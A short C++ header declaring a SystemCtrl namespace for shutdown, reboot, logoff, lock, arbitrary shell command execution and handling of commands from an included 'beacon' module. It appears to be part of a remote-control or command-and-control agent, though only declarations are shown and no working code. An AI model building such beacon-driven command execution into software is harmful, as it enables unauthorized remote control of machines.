#pragma once
#include "../beacon.h"

namespace SystemCtrl {
    void Shutdown();
    void Reboot();
    void Logoff();
    void Lock();
    void ShellExecute(const std::string& command);
    void OnCommand(const Beacon::Command& cmd);
}
